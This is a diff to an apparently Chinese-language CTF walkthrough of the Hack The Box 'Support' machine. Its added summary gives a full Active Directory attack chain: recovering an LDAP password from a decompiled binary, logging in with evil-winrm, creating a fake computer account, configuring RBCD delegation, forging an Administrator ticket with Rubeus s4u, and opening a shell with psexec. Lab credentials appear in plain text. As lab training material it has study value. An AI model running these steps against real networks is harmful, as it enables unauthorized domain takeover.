@@ -1,4 +1,120 @@
 ## Support
+### 总结
+```
+总结
+
+[★]$ smbclient \\\\10.129.230.181\\support-tools
+
+  UserInfo.exe.zip                    
+  windirstat1_1_2_setup.exe           
+  WiresharkPortable64_3.6.5.paf.exe      
+
+1.对  UserInfo.exe.zip   使用ILSpy的反编译，得到LDAP服务器进行身份验证的密码nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+2.使用ldapsearch实用程序
+[★]$ sudo apt install ldap-utils
+
+[★]$ ldapsearch -x -H ldap://support.htb \
+-D "support\\ldap" \
+-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
+-b "dc=support,dc=htb" "(objectClass=*)"
+
+得到info: Ironside47pleasure40Watchful
+
+对  UserInfo.exe.zip 也可以使用Apache Directory Studio程序
+[★]$ gunzip ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
+[~/Downloads/ApacheDirectoryStudio][★]$ ./ApacheDirectoryStudio
+结果同上 得到Info
+
+3.进一步5985/tcp (WinRM)
+[★]$ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb                
+
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADDomain //用来查询当前 Active Directory 域的基本信息；
+
+*Evil-WinRM* PS C:\Users\support\Documents> whoami /groups
+SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103
+
+4.
+[★]$ sudo neo4j start
+https://github.com/SpecterOps/BloodHound-Legacy/releases
+[★]$ unzip BloodHound-linux-x64.zip
+
+从远程收集数据在我们继续之前。为此，让我们继续在本地克隆BloodHound GitHub项目https://github.com/SpecterOps/BloodHound-Legacy
+[★]$ git clone https://github.com/BloodHoundAD/BloodHound
+[★]$ ls BloodHound/Collectors/
+AzureHound.md  DebugBuilds  SharpHound.exe  SharpHound.ps1
+
+*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe
+*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound.exe
+得到20260131001204_BloodHound.zip 
+导入到 
+[~/Downloads/BloodHound-linux-x64][★]$ ./BloodHound --no-sandbox --disable-gpu
+由于GenericAll特权，我们可以执行基于资源的约束授权（RBCD）攻击并升级我们的特权
+点击GenericAll的右键Help:
+利用对“计算机对象(Computer Object)”拥有 GenericAll（完全控制）权限来进行攻击的方法，核心是：可以用来做 RBCD（Resource-Based Constrained Delegation，基于资源的约束委派）攻击
+可以用 Rubeus 工具来利用这个权限进行攻击
+
+如果你还没有“带 SPN 的账户”怎么办？ [1]如果你现在没有一个带 SPN 的账户（计算机账户默认就有 SPN），
+你可以用 Powermad 工具 创建一个新的计算机账户（你控制的）：
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+创建一个叫 attackersystem$ 的计算机账户,密码是 Summer2018!
+[2]然后获取这个新机器账户的 SID:
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+用 PowerView 查询 attackersystem$ 这个计算机账户
+取出它的 SID（安全标识符）
+把它写进目标计算机的：msDS-AllowedToActOnBehalfOfOtherIdentity
+1. 用 Rubeus 发 S4U 请求
+2. 冒充 Administrator 访问目标主机（RBCD）
+ 最终目标：以管理员身份访问另一台机器
+5.工具和获取信息
+*Evil-WinRM* PS C:\Users\support\Documents> upload PowerView.ps1
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Documents> upload Powermad.ps1
+https://github.com/Kevin-Robertson/Powermad
+*Evil-WinRM* PS C:\Users\support\Documents> upload Rubeus.exe
+https://github.com/GhostPack/Rubeus
+
+
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
+
+*Evil-WinRM* PS C:\Users\support\Documents> . ./PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
+
+*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force) 
+
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -identity FAKE-COMP01 
+6.配置
+
+*Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
+
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+
+*Evil-WinRM* PS C:\Users\support\Documents> . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
+
+*Evil-WinRM* PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor
+
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl
+
+得到SecurityIdentifier被设置为我们看到的FAKE-COMP01的SID将AceType设置为AccessAllowed
+
+S4U攻击
+*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+
+*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:FAKE-COMP01$
+/rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+
+Rubeus成功地弄到了票
+7.票据转换为Impacket可以使用的格式。这可以通过Impackets TicketConverter.py实现，以及要获取shell，我们可以使用Impackets的psexec.py
+
+[★]$ git clone https://github.com/fortra/impacket.git
+[★]$ ticketConverter.py ticket.kirbi ticket.ccache
+
+[★]$ KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
+```
 ```
 [★]$ nmap 10.129.230.181 -sC -sV
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-29 03:08 CST
@@ -326,20 +442,6 @@ Bind password:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz  //Ctrl+V
 Error while opening connection
  -  MSG_04177_CONNECTION_TIMEOUT (5000)
 org.apache.directory.studio.connection.core.io.StudioLdapException:  MSG_04177_CONNECTION_TIMEOUT (5000)
-	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.toStudioLdapException(DirectoryApiConnectionWrapper.java:1350)
-	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.access$2(DirectoryApiConnectionWrapper.java:1342)
-	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper$1.run(DirectoryApiConnectionWrapper.java:258)
-	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.runAndMonitor(DirectoryApiConnectionWrapper.java:1261)
-	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.doConnect(DirectoryApiConnectionWrapper.java:280)
-	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.connect(DirectoryApiConnectionWrapper.java:144)
-	at org.apache.directory.studio.connection.core.jobs.OpenConnectionsRunnable.run(OpenConnectionsRunnable.java:111)
-	at org.apache.directory.studio.connection.core.jobs.StudioConnectionJob.run(StudioConnectionJob.java:109)
-	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:63)
-Caused by: org.apache.directory.ldap.client.api.exception.LdapConnectionTimeOutException: MSG_04177_CONNECTION_TIMEOUT (5000)
-	at org.apache.directory.ldap.client.api.LdapNetworkConnection.tryConnect(LdapNetworkConnection.java:732)
-	at org.apache.directory.ldap.client.api.LdapNetworkConnection.connect(LdapNetworkConnection.java:970)
-	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper$1.run(DirectoryApiConnectionWrapper.java:227)
-	... 6 more
 
  MSG_04177_CONNECTION_TIMEOUT (5000)
 
@@ -359,7 +461,7 @@ info 字段本来常见内容应该是：
 “Temporary account”
 “Helpdesk user”
 ```
-#### 在用户列表中，有一个似乎很突出，叫做“支持”。查看这个用户的属性，我们发现a非默认标签名为info，值为Ironside47pleasure40Watchful。这看起来很像密码。再往下看，我们还可以看到该用户是Remote Management Users的成员组，允许它们通过WinRM进行连接。为此，让我们尝试使用evil-winrm来连接使用已识别的密码远程联系支持用户。
+#### 在用户列表中，有一个似乎很突出，叫做“support”。查看这个用户的属性，我们发现a非默认标签名为info，值为Ironside47pleasure40Watchful。这看起来很像密码。再往下看，我们还可以看到该用户是Remote Management Users的成员组，允许它们通过WinRM进行连接。为此，让我们尝试使用evil-winrm来连接使用已识别的密码远程联系支持用户。
 #### 5985/tcp (WinRM)
 ```
 [★]$ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb                                        
